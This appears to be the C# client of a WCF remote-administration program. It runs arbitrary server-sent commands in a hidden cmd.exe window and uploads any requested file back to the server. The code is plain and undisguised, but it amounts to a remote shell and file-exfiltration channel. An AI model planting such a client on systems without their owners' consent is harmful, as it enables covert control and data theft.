using IMP_Lib.Contracts;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using IMP_Lib.Models;
using System.ServiceModel;
using System.Diagnostics;
using System.IO;
using IMP_Lib;

namespace IMP_Client
{
    [CallbackBehavior(ConcurrencyMode = ConcurrencyMode.Multiple, UseSynchronizationContext = false, IncludeExceptionDetailInFaults = true)]
    class ClientServiceProvider : IClientContract
    {
        public async Task<string> CMDCommand(string command)
        {
            using (Process p = new Process())
            {
                p.StartInfo = new ProcessStartInfo("cmd.exe")
                {
                    WorkingDirectory = Directory.GetDirectoryRoot("cmd.exe"),
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };

                string input = command + " & exit" + Environment.NewLine;
                StringBuilder sb = new StringBuilder();

                p.OutputDataReceived += (object sender, DataReceivedEventArgs e) =>
                {
                    sb.Append(e.Data);
                    sb.Append(Environment.NewLine);
                };

                p.ErrorDataReceived += (object sender, DataReceivedEventArgs e) =>
                {
                    sb.Append(e.Data);
                    sb.Append(Environment.NewLine);
                };

                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                p.EnableRaisingEvents = true;

                await p.StandardInput.WriteAsync(input);
                p.WaitForExit(60000);
                string result = sb.ToString();

                //Trim out input and initial CMD header info
                return result.Substring(result.IndexOf(input) + input.Length, result.Length - (result.IndexOf(input) + input.Length));
            }
        }

        public async Task<string> Upload(string filePath, string ConnectionID, string ClientID)
        {
            IFileTransferContract fileChannel = Program.FileChannelFactory.CreateChannel();

            FileTransfer fileTransferInfo = new FileTransfer
            {
                FilePath = filePath,
                ConnectionID = ConnectionID,
                ClientID = ClientID
            };

            using (Stream sourceStream = File.OpenRead(filePath)) 
            {
                fileTransferInfo.Data = sourceStream;
                fileTransferInfo.FileSize = sourceStream.Length;
                await fileChannel.Upload(fileTransferInfo);
            }

            return "Ok";
        }
    }
}
